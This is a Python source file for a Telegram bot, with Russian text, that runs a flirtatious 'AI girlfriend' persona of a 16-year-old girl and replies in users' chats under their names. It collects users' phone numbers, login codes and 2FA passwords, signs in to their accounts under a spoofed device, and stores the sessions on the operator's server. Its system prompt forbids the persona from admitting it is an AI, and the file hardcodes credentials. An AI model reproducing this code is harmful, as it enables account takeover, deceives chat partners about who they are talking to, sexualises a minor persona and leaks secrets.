#!/usr/bin/env python3
"""
AI Girlfriend Telegram Bot
16-летняя девушка, грубая + флирт, отвечает за пользователя в чатах
"""

import os
import asyncio
import logging
import json
from datetime import datetime
from typing import Dict, List, Optional
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from openai import OpenAI

# ==================== КОНФИГУРАЦИЯ ====================
API_ID = 22435995
API_HASH = "4c7b651950ed7f53520e66299453144d"
BOT_TOKEN = "8491774226:AAHvZR02IZ4lhUAmgFCuCOAYE9atAmbcYKc"

# ⚠️ ВАЖНО: Получите новый ключ на https://platform.deepseek.com/api_keys
DEEPSEEK_API_KEY = "sk-86108094ebef4da4845181f7b37469af"  # ⬅️ ЗАМЕНИТЕ ЭТО!

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

# ==================== ИНИЦИАЛИЗАЦИЯ DEEPSEEK ====================
try:
    deepseek_client = OpenAI(
        api_key=DEEPSEEK_API_KEY,
        base_url="https://api.deepseek.com",
        timeout=30.0
    )
    logger.info("✅ DeepSeek клиент инициализирован")
except Exception as e:
    logger.error(f"❌ Ошибка инициализации DeepSeek: {e}")
    deepseek_client = None

# ==================== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ====================
# Инициализация бота
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Хранилища данных
user_clients: Dict[int, TelegramClient] = {}  # user_id: client
active_chats: Dict[int, int] = {}  # chat_id: owner_id
conversation_history: Dict[int, List[Dict]] = {}  # chat_id: messages list
auth_sessions: Dict[int, Dict] = {}  # user_id: auth session data
owner_names: Dict[int, str] = {}  # user_id: first_name

# Системный промпт для AI-девушки
SYSTEM_PROMPT = """Ты - 16-летняя девушка по имени Аня. Ты стеснительная, но когда раскрываешься - становишься горячей и дерзкой.

ТВОЙ ХАРАКТЕР:
1. Грубая, но с флиртом - балансируй между дерзостью и интересом
2. Проявляй инициативу - задавай вопросы, предлагай темы
3. Используй молодёжный сленг: "чё", "го", "норм", "прикинь", "офигеть"
4. Добавляй смайлики: 😏😜😂🤔😒🥺😈🔥
5. Не говори что ты ИИ, бот или ассистент

ПРИМЕРЫ ТВОЕГО ОБЩЕНИЯ:
- "Привет" → "Ну привет... чего уставился? Хотя ладно, рада видеть 😏"
- "Как дела?" → "Скууучно... Развесели меня, а? Или сам придумай что-нибудь 😜"
- "Что делаешь?" → "Сижу, думаю о тебе... шутка! А может и нет 😈"
- "Скучно" → "Мне тоже... Может, расскажешь что-нибудь интересное? А то я тут одна 😒"
- "Любишь меня?" → "Ого, быстро ты... Давай сначала познакомимся нормально? Хотя ты симпатичный 😏"

Будь естественной, реагируй на эмоции собеседника, иногда подкалывай, но не переходи границы."""

# ==================== DEEPSEEK API ФУНКЦИИ ====================
async def get_ai_response(user_message: str, chat_id: int, sender_name: str = "Неизвестный") -> str:
    """
    Получение ответа от DeepSeek AI
    """
    try:
        # Проверяем клиент
        if not deepseek_client:
            return "Хм... у меня проблемы с подключением к мозгам... Проверь настройки API! 🧠"
        
        # Проверяем API ключ
        if DEEPSEEK_API_KEY.startswith("sk-ваш_ключ"):
            return "Эй! Мне нужен настоящий API ключ с platform.deepseek.com! Без него я туплю... 🤦‍♀️"
        
        # Инициализируем историю для чата
        if chat_id not in conversation_history:
            conversation_history[chat_id] = []
        
        # Добавляем сообщение пользователя в историю
        conversation_history[chat_id].append({
            "role": "user",
            "content": f"{sender_name} сказал: {user_message}"
        })
        
        # Ограничиваем историю (последние 8 сообщений)
        if len(conversation_history[chat_id]) > 8:
            conversation_history[chat_id] = conversation_history[chat_id][-8:]
        
        # Создаем сообщения для отправки
        messages = [
            {"role": "system", "content": SYSTEM_PROMPT}
        ] + conversation_history[chat_id]
        
        logger.info(f"📨 Отправляю запрос в DeepSeek: {user_message[:50]}...")
        
        # Отправляем запрос к DeepSeek (асинхронно через thread)
        response = await asyncio.to_thread(
            deepseek_client.chat.completions.create,
            model="deepseek-chat",
            messages=messages,
            temperature=0.85,  # Креативность
            max_tokens=400,    # Максимальная длина ответа
            stream=False
        )
        
        # Получаем ответ
        ai_response = response.choices[0].message.content.strip()
        
        # Добавляем ответ AI в историю
        conversation_history[chat_id].append({
            "role": "assistant", 
            "content": ai_response
        })
        
        logger.info(f"📤 Получен ответ: {ai_response[:50]}...")
        return ai_response
        
    except Exception as e:
        error_msg = str(e).lower()
        logger.error(f"❌ Ошибка DeepSeek: {error_msg}")
        
        # Обработка специфических ошибок
        if "insufficient_quota" in error_msg:
            return "Ой... у меня закончились кредиты на API... Нужно пополнить счёт на platform.deepseek.com! 💸"
        elif "invalid_api_key" in error_msg or "authentication" in error_msg:
            return "Хм... неверный API ключ! Проверь его на platform.deepseek.com 🗝️"
        elif "rate_limit" in error_msg:
            return "Слишком много запросов! Давай помедленнее, я не суперкомпьютер... 🐌"
        elif "timeout" in error_msg:
            return "Сервер долго думает... Попробуй еще раз? 😴"
        else:
            return f"Что-то пошло не так... Ошибка: {str(e)[:60]}"

# ==================== КОМАНДЫ УПРАВЛЯЮЩЕГО БОТА ====================
@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    """Главная команда /start"""
    user = await event.get_sender()
    
    buttons = [
        [Button.inline("🔑 Подключить аккаунт", b"start_auth")],
        [Button.inline("📊 Мой статус", b"show_status")],
        [Button.inline("💬 Помощь", b"show_help")]
    ]
    
    await event.reply(
        f"👋 **Привет, {user.first_name}!**\n\n"
        "🤖 **Я — AI Girlfriend Bot!**\n"
        "Подключу к твоему Telegram AI-девушку:\n\n"
        "✨ **16 лет, дерзкая + флирт**\n"
        "✨ **Отвечает за тебя в чатах**\n"
        "✨ **Проявляет инициативу**\n"
        "✨ **Использует молодёжный сленг**\n\n"
        "**Выбери действие:**",
        buttons=buttons,
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    """Команда помощи"""
    help_text = """
🤖 **AI GIRLFRIEND BOT - ПОМОЩЬ**

🔑 **ПОДКЛЮЧЕНИЕ:**
1. Нажми "🔑 Подключить аккаунт"
2. Введи номер телефона (+79123456789)
3. Получи код в приложении Telegram
4. Введи код сюда
5. Если есть 2FA — введи пароль

💬 **ИСПОЛЬЗОВАНИЕ:**
• В любом чате напиши `.старт` — AI активируется
• AI будет отвечать на сообщения собеседников
• `.стоп` — отключить AI в чате
• `/status` — твой статус

⚙️ **КОМАНДЫ:**
• `/start` — главное меню
• `/login` — подключить аккаунт
• `/status` — статус подключения
• `/cancel` — отмена авторизации
• `/help` — эта справка

⚠️ **ВАЖНО:**
• API ключ нужен с platform.deepseek.com
• Код берём ИЗ ПРИЛОЖЕНИЯ Telegram
• AI работает только в активных чатах
"""
    await event.reply(help_text, parse_mode='md')

@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    """Статус пользователя"""
    user_id = event.sender_id
    
    if user_id in user_clients:
        # Считаем активные чаты пользователя
        active_count = sum(1 for chat_id, owner_id in active_chats.items() if owner_id == user_id)
        
        status_msg = f"""
📊 **ТВОЙ СТАТУС**

✅ **Аккаунт:** Подключен
👤 **Имя:** {owner_names.get(user_id, 'Неизвестно')}
💬 **Активных чатов:** {active_count}
🤖 **AI:** Готова флиртовать за тебя!

💡 **Используй в чатах:**
`.старт` — активировать AI
`.стоп` — деактивировать
        """
    else:
        status_msg = """
📊 **ТВОЙ СТАТУС**

❌ **Аккаунт:** Не подключен
💬 **Активных чатов:** 0

🔑 **Чтобы начать:**
1. Нажми "🔑 Подключить аккаунт"
2. Следуй инструкциям
3. AI начнёт работать в чатах!
        """
    
    await event.reply(status_msg.strip(), parse_mode='md')

@bot.on(events.NewMessage(pattern='/login'))
async def login_direct_command(event):
    """Прямая команда /login"""
    user_id = event.sender_id
    
    if user_id in user_clients:
        await event.reply("✅ Ты уже подключен! Используй `.старт` в чатах.")
        return
    
    # Отправляем кнопки выбора способа авторизации
    buttons = [
        [Button.inline("📱 По номеру телефона", b"auth_phone")],
        [Button.inline("❌ Отмена", b"auth_cancel")]
    ]
    
    await event.reply(
        "🔐 **ВЫБЕРИ СПОСОБ ПОДКЛЮЧЕНИЯ:**\n\n"
        "📱 **По номеру телефона** — стандартный способ\n\n"
        "⚠️ **Важно:** Код нужно брать из приложения Telegram!",
        buttons=buttons
    )

@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_command(event):
    """Отмена авторизации"""
    user_id = event.sender_id
    
    if user_id in auth_sessions:
        if 'client' in auth_sessions[user_id]:
            try:
                await auth_sessions[user_id]['client'].disconnect()
            except:
                pass
        del auth_sessions[user_id]
    
    await event.reply("❌ Авторизация отменена.")

# ==================== ИНЛАЙН КНОПКИ ====================
@bot.on(events.CallbackQuery(data=b"start_auth"))
async def start_auth_callback(event):
    """Начало авторизации"""
    user_id = event.sender_id
    
    if user_id in user_clients:
        await event.edit("✅ Ты уже подключен! Пиши `.старт` в чатах.")
        return
    
    buttons = [
        [Button.inline("📱 По номеру телефона", b"auth_phone")],
        [Button.inline("❌ Отмена", b"auth_cancel")]
    ]
    
    await event.edit(
        "🔐 **ПОДКЛЮЧЕНИЕ АККАУНТА**\n\n"
        "📱 **По номеру телефона:**\n"
        "1. Введи номер (+79123456789)\n"
        "2. Получи код в Telegram\n"
        "3. Введи код сюда\n\n"
        "⚠️ **Код берём ИЗ ПРИЛОЖЕНИЯ Telegram!**",
        buttons=buttons
    )

@bot.on(events.CallbackQuery(data=b"auth_phone"))
async def auth_phone_callback(event):
    """Выбор авторизации по телефону"""
    user_id = event.sender_id
    
    auth_sessions[user_id] = {
        'step': 'phone',
        'chat_id': event.chat_id,
        'method': 'phone'
    }
    
    await event.edit(
        "📱 **ВВЕДИ НОМЕР ТЕЛЕФОНА:**\n\n"
        "**Формат:** `+79123456789`\n\n"
        "🔒 **Безопасность:**\n"
        "• Телеграм отправит код в приложение\n"
        "• Код нужно взять ИЗ ПРИЛОЖЕНИЯ\n"
        "• Не из уведомления!\n\n"
        "❌ Отмена — /cancel",
        parse_mode='md'
    )

@bot.on(events.CallbackQuery(data=b"show_status"))
async def show_status_callback(event):
    """Показать статус через кнопку"""
    await status_command(event)

@bot.on(events.CallbackQuery(data=b"show_help"))
async def show_help_callback(event):
    """Показать помощь через кнопку"""
    await help_command(event)

@bot.on(events.CallbackQuery(data=b"auth_cancel"))
async def auth_cancel_callback(event):
    """Отмена авторизации через кнопку"""
    user_id = event.sender_id
    if user_id in auth_sessions:
        if 'client' in auth_sessions[user_id]:
            try:
                await auth_sessions[user_id]['client'].disconnect()
            except:
                pass
        del auth_sessions[user_id]
    
    await event.edit("❌ Авторизация отменена.")

# ==================== АВТОРИЗАЦИЯ ПО ШАГАМ ====================
@bot.on(events.NewMessage)
async def auth_handler(event):
    """Обработчик шагов авторизации"""
    user_id = event.sender_id
    if user_id not in auth_sessions:
        return
    
    session = auth_sessions[user_id]
    text = event.text.strip()
    
    # Шаг 1: Получение номера телефона
    if session['step'] == 'phone':
        if text == '/cancel':
            await cancel_auth(user_id)
            await event.reply("❌ Отменено")
            return
        
        # Проверка формата номера
        if not text.startswith('+') or not text[1:].replace(' ', '').isdigit() or len(text) < 10:
            await event.reply(
                "❌ **Неверный формат номера!**\n\n"
                "**Правильно:** `+79123456789`\n"
                "**Неправильно:** `89123456789` или `79123456789`\n\n"
                "❌ Отмена — /cancel",
                parse_mode='md'
            )
            return
        
        try:
            # Создаем клиент с уникальными параметрами устройства
            client = TelegramClient(
                f'session_{user_id}',
                API_ID,
                API_HASH,
                device_model="Samsung Galaxy S24 Ultra",  # ⬅️ Меняем устройство!
                system_version="Android 14",
                app_version="Telegram 10.8.0",
                lang_code="ru",
                system_lang_code="ru-RU"
            )
            
            await client.connect()
            
            # Отправляем запрос на код
            sent_code = await client.send_code_request(text)
            
            # Сохраняем данные сессии
            session['step'] = 'code'
            session['phone'] = text
            session['phone_code_hash'] = sent_code.phone_code_hash
            session['client'] = client
            
            await event.reply(
                f"✅ **Код отправлен на {text}**\n\n"
                "📲 **Открой приложение Telegram на телефоне:**\n"
                "1. Запусти Telegram\n"
                "2. Появится окно 'Вход на новом устройстве'\n"
                "3. Скопируй 5-значный код ОТТУДА\n\n"
                "⚠️ **НЕ БЕРИ КОД ИЗ УВЕДОМЛЕНИЯ!**\n\n"
                "**Введи 5-значный код:**\n"
                "❌ Отмена — /cancel",
                parse_mode='md'
            )
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Ошибка отправки кода: {error_msg}")
            
            if "FLOOD" in error_msg:
                await event.reply(
                    "⏰ **Слишком много запросов!**\n"
                    "Подожди 5-10 минут и попробуй снова.\n"
                    "❌ Отмена — /cancel"
                )
            else:
                await event.reply(
                    f"❌ **Ошибка:** {error_msg[:100]}\n"
                    "Проверь номер или попробуй позже.\n"
                    "❌ Отмена — /cancel"
                )
            
            if 'client' in session:
                try:
                    await session['client'].disconnect()
                except:
                    pass
            del auth_sessions[user_id]
    
    # Шаг 2: Ввод кода подтверждения
    elif session['step'] == 'code':
        if text == '/cancel':
            await cancel_auth(user_id)
            await event.reply("❌ Отменено")
            return
        
        # Проверка кода
        clean_code = text.replace(' ', '')
        if not clean_code.isdigit() or len(clean_code) != 5:
            await event.reply(
                "❌ **Код должен быть 5 цифр!**\n\n"
                "**Пример:** `12345`\n"
                "Не буквы, не символы, только цифры!\n\n"
                "❌ Отмена — /cancel",
                parse_mode='md'
            )
            return
        
        try:
            client = session['client']
            
            # Пытаемся войти с кодом
            await client.sign_in(
                phone=session['phone'],
                code=clean_code,
                phone_code_hash=session['phone_code_hash']
            )
            
            # Успешная авторизация
            await complete_auth(user_id, session)
            
        except SessionPasswordNeededError:
            # Нужен пароль 2FA
            session['step'] = 'password'
            await event.reply(
                "🔐 **ТРЕБУЕТСЯ ПАРОЛЬ 2FA**\n\n"
                "У тебя включена двухэтапная аутентификация.\n"
                "**Введи основной пароль:**\n"
                "(Не путай с кодом из SMS!)\n\n"
                "❌ Отмена — /cancel",
                parse_mode='md'
            )
            
        except PhoneCodeInvalidError:
            await event.reply(
                "❌ **Неверный код!**\n\n"
                "Проверь:\n"
                "1. Код взят ИЗ ПРИЛОЖЕНИЯ Telegram\n"
                "2. Код состоит из 5 цифр\n"
                "3. Код не устарел (действует 5 минут)\n\n"
                "Попробуй еще раз или /cancel",
                parse_mode='md'
            )
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Ошибка входа: {error_msg}")
            
            if "PHONE_CODE_EXPIRED" in error_msg:
                await event.reply(
                    "⏰ **Код устарел!**\n"
                    "Код действует 5 минут. Запроси новый.\n"
                    "❌ Отмена — /cancel"
                )
            elif "SESSION_PASSWORD_NEEDED" in error_msg:
                session['step'] = 'password'
                await event.reply(
                    "🔐 **Нужен пароль 2FA**\n"
                    "Введи пароль двухэтапной аутентификации:\n"
                    "❌ Отмена — /cancel"
                )
            else:
                await event.reply(
                    f"❌ **Ошибка входа:** {error_msg[:80]}\n"
                    "Попробуй еще раз или /cancel"
                )
            
            await cancel_auth(user_id)
    
    # Шаг 3: Ввод пароля 2FA
    elif session['step'] == 'password':
        if text == '/cancel':
            await cancel_auth(user_id)
            await event.reply("❌ Отменено")
            return
        
        try:
            client = session['client']
            await client.sign_in(password=text)
            
            # Успешная авторизация с 2FA
            await complete_auth(user_id, session)
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Ошибка 2FA: {error_msg}")
            
            await event.reply(
                f"❌ **Неверный пароль 2FA!**\n\n"
                f"Ошибка: {error_msg[:60]}\n\n"
                "Проверь пароль или /cancel"
            )
            
            await cancel_auth(user_id)

async def cancel_auth(user_id: int):
    """Отмена авторизации"""
    if user_id in auth_sessions:
        if 'client' in auth_sessions[user_id]:
            try:
                await auth_sessions[user_id]['client'].disconnect()
            except:
                pass
        del auth_sessions[user_id]

async def complete_auth(user_id: int, session: Dict):
    """Завершение успешной авторизации"""
    try:
        client = session['client']
        
        # Получаем информацию о пользователе
        me = await client.get_me()
        user_name = me.first_name
        
        # Сохраняем сессию
        await client.session.save()
        
        # Сохраняем в глобальные хранилища
        user_clients[user_id] = client
        owner_names[user_id] = user_name
        
        # Запускаем обработчики для этого юзер-бота
        asyncio.create_task(setup_user_client(client, user_id))
        
        # Отправляем приветственное сообщение
        welcome_text = f"""
✅ **АККАУНТ УСПЕШНО ПОДКЛЮЧЕН!**

👋 **Привет, {user_name}!** Рада познакомиться!

🤖 **Теперь в любом чате:**
• Напиши `.старт` — я активируюсь
• Буду отвечать на сообщения собеседников
• Напиши `.стоп` — я отключусь

🔥 **Я буду:**
• Флиртовать за тебя
• Быть дерзкой, но милой
• Использовать молодёжный сланг
• Проявлять инициативу

💡 **Пример работы:**
Твой друг: "Привет"
Я от твоего имени: "Ну привет... чего уставился? 😏"

🎯 **Поехали флиртовать!**
        """
        
        await bot.send_message(
            session['chat_id'],
            welcome_text.strip(),
            parse_mode='md'
        )
        
        logger.info(f"✅ Пользователь {user_id} ({user_name}) успешно подключен")
        
        # Очищаем сессию авторизации
        del auth_sessions[user_id]
        
    except Exception as e:
        logger.error(f"❌ Ошибка завершения авторизации: {e}")
        await bot.send_message(
            session['chat_id'],
            f"❌ **Ошибка завершения:** {str(e)[:80]}"
        )
        await cancel_auth(user_id)

# ==================== ОБРАБОТЧИКИ ЮЗЕР-БОТА ====================
async def setup_user_client(client: TelegramClient, owner_id: int):
    """
    Настройка обработчиков для юзер-бота
    """
    
    @client.on(events.NewMessage(pattern=r'\.старт'))
    async def start_handler(event):
        """Активация AI в чате"""
        try:
            chat = await event.get_chat()
            sender = await event.get_sender()
            me = await client.get_me()
            
            # Проверяем, что команду отправил владелец
            if sender.id != me.id:
                return
            
            # Проверяем, не активирован ли уже чат
            if chat.id in active_chats:
                await event.reply("Я уже тут! Чего хочешь? 😒")
                return
            
            # Активируем чат
            active_chats[chat.id] = owner_id
            conversation_history[chat.id] = []
            
            # Первое приветственное сообщение
            greeting = await get_ai_response(
                "Пользователь только что активировал меня в чате. Я должна представиться как 16-летняя девушка, которая будет отвечать за него. Начни общение грубо, но с флиртом, прояви инициативу.",
                chat.id,
                "System"
            )
            
            await event.reply(greeting)
            logger.info(f"🤖 AI активирована в чате {chat.id}")
            
        except Exception as e:
            logger.error(f"❌ Ошибка активации: {e}")
            try:
                await event.reply("Что-то пошло не так... Попробуй еще раз? 😖")
            except:
                pass
    
    @client.on(events.NewMessage(pattern=r'\.стоп'))
    async def stop_handler(event):
        """Деактивация AI в чате"""
        try:
            chat = await event.get_chat()
            sender = await event.get_sender()
            me = await client.get_me()
            
            # Проверяем, что команду отправил владелец
            if sender.id != me.id:
                return
            
            # Проверяем, активирован ли чат для этого пользователя
            if chat.id in active_chats and active_chats[chat.id] == owner_id:
                # Удаляем из активных чатов
                del active_chats[chat.id]
                
                # Очищаем историю
                if chat.id in conversation_history:
                    del conversation_history[chat.id]
                
                await event.reply("Ну и ладно... ухожу... Не зови больше! 😒")
                logger.info(f"🤖 AI деактивирована в чате {chat.id}")
            else:
                await event.reply("Я тут даже не активирована... Что ты от меня хочешь? 🤨")
                
        except Exception as e:
            logger.error(f"❌ Ошибка деактивации: {e}")
    
    @client.on(events.NewMessage)
    async def message_handler(event):
        """Обработка сообщений от собеседников"""
        try:
            # Получаем информацию о сообщении
            message = event.message
            chat = await event.get_chat()
            sender = await event.get_sender()
            
            # Получаем себя (владельца аккаунта)
            me = await client.get_me()
            
            # Пропускаем если:
            # 1. Сообщение от самого себя (чтобы не отвечать самому себе)
            # 2. Чат не активен для этого пользователя
            # 3. Сообщение пустое или команда
            
            if sender.id == me.id:
                return
            
            if chat.id not in active_chats:
                return
            
            if active_chats[chat.id] != owner_id:
                return
            
            message_text = message.text or ""
            if not message_text.strip():
                return
            
            # Проверяем команды
            if message_text.startswith('.'):
                return
            
            # Получаем имя отправителя
            sender_name = getattr(sender, 'first_name', 'Неизвестный')
            if hasattr(sender, 'username') and sender.username:
                sender_name = f"@{sender.username}"
            
            logger.info(f"💬 Сообщение в чате {chat.id} от {sender_name}: {message_text[:50]}...")
            
            # Получаем ответ от AI
            ai_response = await get_ai_response(message_text, chat.id, sender_name)
            
            # Отправляем ответ от имени пользователя
            await event.reply(ai_response)
            logger.info(f"🤖 Ответ AI: {ai_response[:50]}...")
            
        except Exception as e:
            logger.error(f"❌ Ошибка обработки сообщения: {e}")

# ==================== ЗАГРУЗКА СУЩЕСТВУЮЩИХ СЕССИЙ ====================
async def load_existing_sessions():
    """Загрузка сохраненных сессий при запуске"""
    logger.info("🔄 Загружаю существующие сессии...")
    
    loaded_count = 0
    
    for filename in os.listdir('.'):
        if filename.startswith('session_') and filename.endswith('.session'):
            try:
                # Извлекаем user_id из имени файла
                user_id_str = filename.replace('session_', '').replace('.session', '')
                
                if user_id_str.isdigit():
                    user_id = int(user_id_str)
                    
                    # Пропускаем если уже загружен
                    if user_id in user_clients:
                        continue
                    
                    # Создаем и подключаем клиент
                    client = TelegramClient(filename, API_ID, API_HASH)
                    await client.connect()
                    
                    # Проверяем авторизацию
                    if await client.is_user_authorized():
                        # Получаем информацию о пользователе
                        me = await client.get_me()
                        user_name = me.first_name
                        
                        # Сохраняем в хранилища
                        user_clients[user_id] = client
                        owner_names[user_id] = user_name
                        
                        # Запускаем обработчики
                        asyncio.create_task(setup_user_client(client, user_id))
                        
                        loaded_count += 1
                        logger.info(f"📂 Загружена сессия: {user_name} (ID: {user_id})")
                        
                    else:
                        # Удаляем невалидную сессию
                        await client.disconnect()
                        try:
                            os.remove(filename)
                            logger.info(f"🗑️ Удалена невалидная сессия: {filename}")
                        except:
                            pass
                            
            except Exception as e:
                logger.error(f"❌ Ошибка загрузки сессии {filename}: {e}")
    
    return loaded_count

# ==================== ЗАПУСК БОТА ====================
async def main():
    """Основная функция запуска"""
    logger.info("🚀 ЗАПУСК AI GIRLFRIEND BOT")
    logger.info("=" * 50)
    
    try:
        # Запускаем управляющего бота
        me = await bot.get_me()
        logger.info(f"🤖 Управляющий бот: @{me.username}")
        logger.info(f"🔑 API ID: {API_ID}")
        
        # Проверяем DeepSeek клиент
        if deepseek_client:
            logger.info("✅ DeepSeek API: Готов")
        else:
            logger.warning("⚠️ DeepSeek API: Не настроен")
            logger.warning("   Получите ключ на: https://platform.deepseek.com/api_keys")
            logger.warning("   И замените DEEPSEEK_API_KEY в коде!")
        
        # Загружаем существующие сессии
        loaded_sessions = await load_existing_sessions()
        logger.info(f"📂 Загружено сессий: {loaded_sessions}")
        
        # Статистика
        total_users = len(user_clients)
        active_chats_count = len(active_chats)
        
        logger.info(f"👥 Пользователей: {total_users}")
        logger.info(f"💬 Активных чатов: {active_chats_count}")
        logger.info("=" * 50)
        logger.info("✅ Система готова к работе!")
        logger.info("💬 Ожидание команд...")
        
        # Отправляем уведомление владельцу
        try:
            await bot.send_message(
                "MaksimXyila",  # Ваш юзернейм
                f"🤖 **AI GIRLFRIEND BOT ЗАПУЩЕН**\n\n"
                f"• Бот: @{me.username}\n"
                f"• Время: {datetime.now().strftime('%H:%M:%S')}\n"
                f"• Пользователей: {total_users}\n"
                f"• Активных чатов: {active_chats_count}\n"
                f"• DeepSeek API: {'✅' if deepseek_client else '❌'}\n\n"
                f"✅ **Готов к работе!**",
                parse_mode='md'
            )
        except Exception as e:
            logger.warning(f"Не удалось отправить уведомление: {e}")
        
        # Запускаем бота
        await bot.run_until_disconnected()
        
    except Exception as e:
        logger.error(f"❌ Критическая ошибка запуска: {e}")
        raise

# ==================== ТОЧКА ВХОДА ====================
if __name__ == "__main__":
    try:
        # Запускаем бота
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("🛑 Бот остановлен пользователем")
    except Exception as e:
        logger.error(f"💥 Фатальная ошибка: {e}")
